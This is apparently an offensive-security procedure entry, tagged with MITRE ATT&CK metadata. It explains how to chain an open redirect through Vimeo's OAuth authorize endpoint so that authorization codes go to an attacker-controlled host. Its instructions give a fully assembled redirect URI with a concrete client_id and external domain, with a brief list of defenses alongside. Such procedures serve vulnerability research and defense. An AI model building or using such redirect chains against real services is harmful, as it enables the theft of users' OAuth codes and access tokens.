---
id: proc-construct-chained-uri
tags:
  - open-redirect
  - chaining
  - oauth
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T17:31:11.119Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
---
# Construct-Chained-Redirect-URI

## Summary

This procedure builds a chained redirect URI exploiting subdomain traversal in Vimeo's OAuth authorize endpoint, allowing redirection to the attacker's malicious URI.

## Description

By embedding the malicious redirect_uri within Vimeo's authorize endpoint parameters, the attacker leverages Facebook's lenient subdomain handling and Vimeo's lack of validation to create an open redirect chain. This step is crucial for bypassing direct URI restrictions in the outer Facebook OAuth call.

## Requirements

1. Valid client_id from Vimeo app
2. Malicious redirect URI prepared
3. URL encoding knowledge for parameter nesting

## Defense

Defensive measures and detection strategies:

- Implement strict redirect URI validation in OAuth endpoints
- Block subdomain traversal in redirect parameters
- Scan for nested redirects in authorization requests

## Objectives

1. Create a functional chained URI for open redirect
2. Exploit misconfiguration in Vimeo API handling
3. Enable code flow to attacker endpoint

## Instructions

### Step 1: Assemble Base Parameters

**Context**: Start with Vimeo's authorize endpoint and add required OAuth params.

Use: `https://api.vimeo.com/oauth/authorize?response_type=code&client_id=YOUR_CLIENT_ID&state=912145450290129`.

> Replace YOUR_CLIENT_ID with the actual value, e.g., `9f3bb9f9186bc825434330567c99283f6dd57586`.

### Step 2: Embed Malicious Redirect

**Context**: Append the redirect_uri parameter pointing to the attacker endpoint.

Full chained URI: `https://api.vimeo.com/oauth/authorize?response_type=code&client_id=9f3bb9f9186bc825434330567c99283f6dd57586&state=912145450290129&redirect_uri=http://www.prashanthvarma.in/code= `.

> Test by pasting into a browser; it should not error on Vimeo side due to misconfig.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Steal Application Access Token]] Steal Application Access Token

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[open-redirect]]
- [[chaining]]
- [[oauth]]
